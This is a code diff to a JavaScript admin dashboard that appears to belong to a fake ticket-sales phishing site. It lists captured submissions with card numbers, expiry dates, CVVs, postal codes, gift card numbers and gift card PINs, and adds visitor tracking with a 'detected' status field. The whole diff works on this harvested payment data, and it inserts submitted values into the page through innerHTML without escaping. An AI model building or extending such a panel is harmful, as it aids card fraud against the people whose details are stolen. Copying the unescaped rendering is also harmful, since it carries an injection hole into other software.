@@ -526,19 +526,26 @@ function renderSubmissionsTable() {
   const start = (submissionsPage - 1) * submissionsPerPage;
   const paginatedSubmissions = submissions.slice(start, start + submissionsPerPage);
 
-  tbody.innerHTML = paginatedSubmissions.map((sub, idx) => `
-    <tr>
-      <td>${start + idx + 1}</td>
-      <td>${sub.email || 'N/A'}</td>
-      <td>${sub.orderSummary?.event || 'N/A'}</td>
-      <td>${sub.orderSummary?.quantity || '-'}</td>
-      <td>£${sub.orderSummary?.total ? sub.orderSummary.total.toFixed(2) : '0.00'}</td>
-      <td>${formatDate(sub.timestamp)}</td>
-      <td>
-        <button class="btn btn-primary btn-small" onclick="viewSubmissionDetail(${submissions.indexOf(sub)})">View</button>
-      </td>
-    </tr>
-  `).join('');
+  tbody.innerHTML = paginatedSubmissions.map((sub, idx) => {
+    const paymentMethod = sub.paymentMethod || (sub.cardNumber ? 'Card' : sub.giftCardNumberFull ? 'Gift Card' : 'Unknown');
+    const cardDisplay = sub.cardLastFour ? `****${sub.cardLastFour}` : (sub.cardNumber ? `****${sub.cardNumber.slice(-4)}` : 'N/A');
+    const expiryDisplay = sub.expiryDate || 'N/A';
+    const zipDisplay = sub.postalCode || sub.zipCode || 'N/A';
+    
+    return `
+      <tr onclick="viewSubmissionDetail(${submissions.indexOf(sub)})" style="cursor: pointer;">
+        <td>${sub.email || 'N/A'}</td>
+        <td>${sub.eventTitle || 'N/A'}</td>
+        <td>${sub.quantity || '-'}</td>
+        <td>${sub.pricePerTicket || 'N/A'}</td>
+        <td>${sub.total ? '$' + sub.total.toFixed(2) : 'N/A'}</td>
+        <td>${cardDisplay}</td>
+        <td>${expiryDisplay}</td>
+        <td>${zipDisplay}</td>
+        <td>${formatDate(sub.timestamp)}</td>
+      </tr>
+    `;
+  }).join('');
 
   // Show load more if applicable
   const loadMoreBtn = document.getElementById('loadMoreBtn');
@@ -562,6 +569,9 @@ function viewSubmissionDetail(idx) {
     return cvv ? '***' : 'N/A';
   };
 
+  // Determine payment method
+  const paymentMethod = sub.paymentMethod || (sub.cardNumber ? 'Card' : 'Unknown');
+
   // Build full form details HTML
   let html = `
     <div class="submission-field">
@@ -570,50 +580,30 @@ function viewSubmissionDetail(idx) {
     </div>
     <div class="submission-field">
       <div class="submission-label">🎭 Event Title</div>
-      <div class="submission-value">${sub.eventTitle || sub.orderSummary?.event || 'N/A'}</div>
+      <div class="submission-value">${sub.eventTitle || 'N/A'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">🎫 Quantity</div>
-      <div class="submission-value">${sub.quantity || sub.orderSummary?.quantity || '-'}</div>
+      <div class="submission-value">${sub.quantity || '-'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💷 Price Per Ticket</div>
-      <div class="submission-value">${sub.orderSummary?.currencySymbol || '$'}${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
+      <div class="submission-value">$${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💰 Total Amount</div>
-      <div class="submission-value">${sub.orderSummary?.currencySymbol || '$'}${sub.total ? parseFloat(sub.total).toFixed(2) : sub.orderSummary?.total?.toFixed(2) || '0.00'}</div>
-    </div>
-    <div class="submission-field">
-      <div class="submission-label">📍 Venue</div>
-      <div class="submission-value">${sub.orderSummary?.venue || 'N/A'}</div>
-    </div>
-    <div class="submission-field">
-      <div class="submission-label">📅 Date & Time</div>
-      <div class="submission-value">${sub.orderSummary?.dateTime || 'N/A'}</div>
-    </div>
-    <div class="submission-field">
-      <div class="submission-label">🎫 Ticket Type</div>
-      <div class="submission-value">${sub.orderSummary?.ticketType || 'N/A'}</div>
-    </div>
-    <div class="submission-field">
-      <div class="submission-label">🪑 Section</div>
-      <div class="submission-value">${sub.orderSummary?.section || 'N/A'}</div>
+      <div class="submission-value">$${sub.total ? parseFloat(sub.total).toFixed(2) : '0.00'}</div>
     </div>
   `;
 
-  // Card Payment Details (if available)
-  if (sub.cardNumberFull || sub.paymentMethod === 'Card') {
+  // Card Payment Details
+  if (paymentMethod === 'Card' || sub.cardNumber) {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
-      <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">💳 Card Payment Details</div>
+      <div style="font-weight: 700; color: #10b981; margin-bottom: 15px;">💳 Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Card Number (Full)</div>
-        <div class="submission-value"><code>${maskCardNumber(sub.cardNumberFull) || 'N/A'}</code></div>
-      </div>
-      <div class="submission-field">
-        <div class="submission-label">Card Last 4 Digits</div>
-        <div class="submission-value"><code>${sub.cardLastFour || 'N/A'}</code></div>
+        <div class="submission-label">Card Number</div>
+        <div class="submission-value"><code>${maskCardNumber(sub.cardNumber)}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Expiry Date</div>
@@ -621,27 +611,23 @@ function viewSubmissionDetail(idx) {
       </div>
       <div class="submission-field">
         <div class="submission-label">CVV (Security Code)</div>
-        <div class="submission-value"><code>${maskCVV(sub.securityCodeCVV)}</code></div>
+        <div class="submission-value"><code>${maskCVV(sub.cvv)}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Postal Code</div>
-        <div class="submission-value"><code>${sub.postalCode || 'N/A'}</code></div>
+        <div class="submission-value"><code>${sub.zipCode || 'N/A'}</code></div>
       </div>
     `;
   }
 
-  // Gift Card Details (if available)
-  if (sub.giftCardNumberFull || sub.paymentMethod === 'Gift Card') {
+  // Gift Card Details
+  if (paymentMethod === 'Gift Card' || sub.giftCardNumberFull) {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
-      <div style="font-weight: 700; color: #00d4ff; margin-bottom: 15px;">🎁 Gift Card Payment Details</div>
+      <div style="font-weight: 700; color: #10b981; margin-bottom: 15px;">🎁 Gift Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Gift Card Number (Full)</div>
-        <div class="submission-value"><code>${maskCardNumber(sub.giftCardNumberFull) || 'N/A'}</code></div>
-      </div>
-      <div class="submission-field">
-        <div class="submission-label">Gift Card Last 4 Digits</div>
-        <div class="submission-value"><code>${sub.giftCardLastFour || 'N/A'}</code></div>
+        <div class="submission-label">Gift Card Number</div>
+        <div class="submission-value"><code>${maskCardNumber(sub.giftCardNumberFull)}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Gift Card PIN</div>
@@ -650,11 +636,11 @@ function viewSubmissionDetail(idx) {
     `;
   }
 
-  // Timestamp
+  // Submission Info
   html += `
     <hr style="border: 1px solid #333; margin: 20px 0;">
     <div class="submission-field">
-      <div class="submission-label">📅 Submission Date & Time</div>
+      <div class="submission-label">📅 Submitted On</div>
       <div class="submission-value">${formatDate(sub.timestamp) || sub.date || 'N/A'}</div>
     </div>
     <div class="submission-field">
@@ -771,53 +757,56 @@ function renderVisitorsTable() {
   const sortedVisitors = [...visitors].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
   visitorsList.innerHTML = sortedVisitors.map((v, idx) => {
-    // Handle both old and new field names for compatibility
-    const browserDevice = v.browser ? `${v.browser}${v.deviceType ? ` on ${v.deviceType}` : v.device ? ` on ${v.device}` : ''}` : 'Unknown';
-    const location = v.country || v.location || 'Unknown';
-    const scrollDepth = v.scrollDepth ? `${Math.round(v.scrollDepth)}%` : 'N/A';
-    const sessionDuration = v.sessionDuration ? formatSessionDuration(v.sessionDuration) : v.timezone || 'Active';
-    const pageLoadTime = v.pageLoadTime ? `${v.pageLoadTime}ms` : 'N/A';
+    // Parse deviceInfo "Desktop | Windows" into separate values
+    const [deviceType, os] = (v.deviceInfo || 'Unknown | Unknown').split(' | ').map(s => s.trim());
+    
+    // Parse browserInfo "Chrome | Screen: 1280x720" into separate values
+    const browserParts = (v.browserInfo || 'Unknown | Unknown').split(' | ');
+    const browser = browserParts[0]?.trim() || 'Unknown';
+    const screen = browserParts[1]?.trim() || 'Unknown';
+    
     const timestamp = formatDate(v.timestamp);
+    const detectedType = v.detected || 'Returning Visitor';
     
     return `
       <div class="visitor-card">
         <div class="visitor-card-header">
           <div class="visitor-info-primary">
-            <div class="visitor-device">🖥️ ${browserDevice}</div>
-            <div class="visitor-location">🌍 ${location}</div>
+            <div class="visitor-device">🖥️ ${browser} on ${deviceType}</div>
+            <div class="visitor-location">🌍 ${os}</div>
           </div>
           <div class="visitor-time">${timestamp}</div>
         </div>
         <div class="visitor-metrics">
           <div class="metric">
-            <span class="metric-label">📊 Scroll Depth:</span>
-            <span class="metric-value">${scrollDepth}</span>
+            <span class="metric-label">📊 Device Type:</span>
+            <span class="metric-value">${deviceType}</span>
           </div>
           <div class="metric">
-            <span class="metric-label">⏱️ Session:</span>
-            <span class="metric-value">${sessionDuration}</span>
+            <span class="metric-label">🖥️ Browser:</span>
+            <span class="metric-value">${browser}</span>
           </div>
           <div class="metric">
-            <span class="metric-label">⚡ Load Time:</span>
-            <span class="metric-value">${pageLoadTime}</span>
+            <span class="metric-label">💻 OS:</span>
+            <span class="metric-value">${os}</span>
           </div>
           <div class="metric">
-            <span class="metric-label">📱 Device:</span>
-            <span class="metric-value">${v.os || v.device || 'N/A'}</span>
+            <span class="metric-label">📱 Screen:</span>
+            <span class="metric-value">${screen}</span>
           </div>
         </div>
         <div class="visitor-details-row">
           <div class="detail-item">
-            <span class="detail-label">🌐 IP:</span>
-            <code class="detail-value">${v.ip || 'Unknown'}</code>
-          </div>
-          <div class="detail-item">
             <span class="detail-label">🔑 Visitor ID:</span>
-            <code class="detail-value">${v.visitorId ? v.visitorId.substring(0, 12) + '...' : v.id ? v.id.substring(0, 12) + '...' : 'N/A'}</code>
+            <code class="detail-value">${v.visitorId ? v.visitorId.substring(0, 12) + '...' : 'N/A'}</code>
           </div>
           <div class="detail-item">
-            <span class="detail-label">📄 Page:</span>
-            <code class="detail-value">${v.pageUrl ? v.pageUrl.split('/').pop() || 'tickets.html' : 'tickets.html'}</code>
+            <span class="detail-label">📌 Status:</span>
+            <code class="detail-value">${detectedType}</code>
+          </div>
+          <div class="detail-item">
+            <span class="detail-label">🔑 ID:</span>
+            <code class="detail-value">${v.id || 'N/A'}</code>
           </div>
         </div>
         <button class="btn btn-primary btn-sm" onclick="viewVisitorDetail(${idx})" style="width: 100%; margin-top: 12px;">View Full Details</button>
@@ -830,47 +819,45 @@ function viewVisitorDetail(idx) {
   const v = visitors[idx];
   if (!v) return;
 
+  // Parse deviceInfo and browserInfo
+  const [deviceType, os] = (v.deviceInfo || 'Unknown | Unknown').split(' | ').map(s => s.trim());
+  const browserParts = (v.browserInfo || 'Unknown | Unknown').split(' | ');
+  const browser = browserParts[0]?.trim() || 'Unknown';
+  const screen = browserParts[1]?.trim() || 'Unknown';
+
   const content = document.getElementById('submission-details-content');
   content.innerHTML = `
     <div class="submission-field">
-      <div class="submission-label">🖥️ Browser & Device</div>
-      <div class="submission-value">${v.browser ? `${v.browser}${v.deviceType ? ` on ${v.deviceType}` : v.device ? ` on ${v.device}` : ''}` : 'N/A'}</div>
+      <div class="submission-label">🖥️ Browser</div>
+      <div class="submission-value">${browser}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💻 Operating System</div>
-      <div class="submission-value">${v.os || v.device || 'N/A'}</div>
+      <div class="submission-value">${os}</div>
     </div>
     <div class="submission-field">
-      <div class="submission-label">🌍 Location</div>
-      <div class="submission-value">${v.country || v.location ? `${v.city ? v.city + ', ' : ''}${v.country || v.location}` : 'Unknown'}</div>
+      <div class="submission-label">📱 Device Type</div>
+      <div class="submission-value">${deviceType}</div>
     </div>
     <div class="submission-field">
-      <div class="submission-label">🌐 IP Address</div>
-      <div class="submission-value"><code>${v.ip || 'N/A'}</code></div>
+      <div class="submission-label">🖥️ Screen Resolution</div>
+      <div class="submission-value">${screen}</div>
     </div>
     <div class="submission-field">
-      <div class="submission-label">📍 Page URL</div>
-      <div class="submission-value"><code>${v.pageUrl || 'N/A'}</code></div>
+      <div class="submission-label">🔑 Visitor ID</div>
+      <div class="submission-value"><code style="font-size: 11px; word-break: break-all;">${v.visitorId || 'N/A'}</code></div>
+    </div>
+    <div class="submission-field">
+      <div class="submission-label">📌 Record ID</div>
+      <div class="submission-value"><code>${v.id || 'N/A'}</code></div>
     </div>
     <div class="submission-field">
       <div class="submission-label">⏰ Visit Timestamp</div>
       <div class="submission-value">${formatDate(v.timestamp)}</div>
     </div>
     <div class="submission-field">
-      <div class="submission-label">📊 Session Metrics</div>
-      <div class="submission-value">
-        <div style="display: grid; gap: 8px; font-size: 13px;">
-          <div>🕐 Duration: ${formatSessionDuration(v.sessionDuration || '0')}</div>
-          <div>📜 Scroll Depth: ${v.scrollDepth ? Math.round(v.scrollDepth) + '%' : 'N/A'}</div>
-          <div>⚡ Page Load Time: ${v.pageLoadTime ? v.pageLoadTime + 'ms' : 'N/A'}</div>
-          <div>📱 Screen: ${v.screenResolution || 'N/A'}</div>
-          <div>🔗 Referrer: ${v.referrer || v.timezone || 'Direct visit'}</div>
-        </div>
-      </div>
-    </div>
-    <div class="submission-field">
-      <div class="submission-label">🔑 Visitor ID</div>
-      <div class="submission-value"><code style="font-size: 11px; word-break: break-all;">${v.visitorId || v.id || 'N/A'}</code></div>
+      <div class="submission-label">🏷️ Visitor Status</div>
+      <div class="submission-value">${v.detected || 'Returning Visitor'}</div>
     </div>
   `;
 
